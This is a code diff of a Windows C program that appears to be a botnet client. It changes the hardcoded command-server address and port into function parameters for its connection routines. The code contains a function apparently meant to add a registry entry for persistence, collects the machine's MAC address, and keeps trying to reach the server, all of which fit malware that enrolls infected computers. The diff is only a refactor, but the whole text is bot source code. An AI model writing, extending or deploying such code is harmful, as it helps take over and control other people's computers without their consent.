@@ -10,8 +10,8 @@
 
 #pragma comment(lib, "ws2_32.lib")
 
-#define SERVER_IP "127.0.0.1"
-#define SERVER_PORT 12345
+// #define SERVER_IP "127.0.0.1"
+// #define SERVER_PORT 12345
 #define BUFFER_SIZE 4096
 #define CHECK_INTERVAL 10000
 
@@ -35,7 +35,7 @@ DWORD WINAPI KeepAliveThread(LPVOID lpParam) {
     return 0;
 }
 
-void bot_connection() {
+void bot_connection(const char* SERVER_ADDR, unsigned short SERVER_PORT) {
     WSADATA wsaData;
     SOCKET sock;
 
@@ -56,7 +56,7 @@ void bot_connection() {
 
     server.sin_family = AF_INET;
     server.sin_port = htons(SERVER_PORT);
-    server.sin_addr.s_addr = inet_addr(SERVER_IP);
+    server.sin_addr.s_addr = inet_addr(SERVER_ADDR);
 
     if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
         printf("Failed to connect -> server. Code %d\n", WSAGetLastError());
@@ -65,7 +65,7 @@ void bot_connection() {
         return;
     }
 
-    printf("Connect to server %s:%d success!\n", SERVER_IP, SERVER_PORT);
+    printf("Connect to server %s:%d success!\n", SERVER_ADDR, SERVER_PORT);
 
     uint8_t mac[6];
     get_mac_address(mac);
@@ -93,7 +93,7 @@ void bot_connection() {
     WSACleanup();
 }
 
-void is_server() {
+void is_server(const char* SERVER_ADDR, unsigned short SERVER_PORT) {
     add_to_reestr();
     WSADATA wsaData;
     SOCKET sock;
@@ -114,10 +114,10 @@ void is_server() {
 
         server.sin_family = AF_INET;
         server.sin_port = htons(SERVER_PORT);
-        server.sin_addr.s_addr = inet_addr(SERVER_IP);
+        server.sin_addr.s_addr = inet_addr(SERVER_ADDR);
 
         if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
-            bot_connection(sock);
+            bot_connection(SERVER_ADDR, SERVER_PORT);
         } else {
             closesocket(sock);
             WSACleanup();
